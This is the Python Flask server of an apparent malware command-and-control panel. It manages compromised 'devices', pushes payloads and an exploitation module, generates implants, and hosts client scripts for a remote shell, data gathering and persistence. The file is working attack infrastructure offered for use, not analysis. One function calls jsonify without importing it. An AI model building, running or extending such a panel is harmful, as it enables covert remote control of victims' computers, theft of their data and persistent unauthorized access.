from flask import Flask, render_template, request, redirect, send_from_directory
import eventlet
import socketio
from c2 import C2
import os
import base64


app = Flask(__name__)
sio = socketio.Server(cors_allowed_origins='*', logger=False)
malware = C2(sio)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/files")
def upload():
    return render_template("upload.html")

@app.route("/payload")
def payload():
    return render_template("payload.html")

@app.route('/terminal/<path:path>')
def terminal(path):
    devices = malware.list_devices()
    if path in devices:
        return render_template("terminal.html")
    else:
        return redirect('/')

@app.route('/term/<path:path>')
def term(path):
    return render_template("jterm.html")

@app.route("/shell.py")
def shell():
    return render_template("client/shell.py")


@app.route("/get_data.py")
def get_data():
    return render_template("client/get_data.py")

@app.route('/client.py')
def client_data():
    return render_template("client/client.py")

@app.route('/persistence.py')
def persistence():
    return render_template("client/persistence.py")

@app.route('/get_payloads/<path:filename>')
def get_payloads(filename):
    return send_from_directory('payloads', filename, as_attachment=True)




@app.route('/devices', methods=['POST'])
def post():
    return malware.list_all_devices()

@app.route('/delete', methods=['POST'])
def delete():
    data = request.get_json()
    malware.delete_device(data['device_id'])
    return ""

@app.route('/ctrl', methods=['POST'])
def ctrl():
    data = request.get_json()
    malware.ctrl(data['device_id'])
    return ""

@app.route('/payload', methods=['POST'])
def payload1():
    data = request.get_json()
    malware.payload(data)
    return ""

@app.route('/download', methods=['POST'])
def download1():
    data = request.get_json()
    malware.generate(data)
    return ""

@app.route('/list_payloads', methods=['POST'])
def list_payloads():
    return str(os.listdir('payloads'))

@app.route('/explotation_module', methods=['POST'])
def send_explotation_module():
    data = request.get_json()
    malware.explotation_module(data)
    return ""


@app.route('/upload_file', methods=['POST'])
def upload_file():
    file = request.files['file']
    
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    
    if file:
        # Read the file and convert to base64
        file_content = file.read()
        base64_encoded = base64.b64encode(file_content).decode('utf-8')
        
        return jsonify({'base64': base64_encoded})

if __name__ == "__main__":
    flaskApp = socketio.Middleware(sio, app)
    eventlet.wsgi.server(eventlet.listen(('0.0.0.0', 5000)), flaskApp)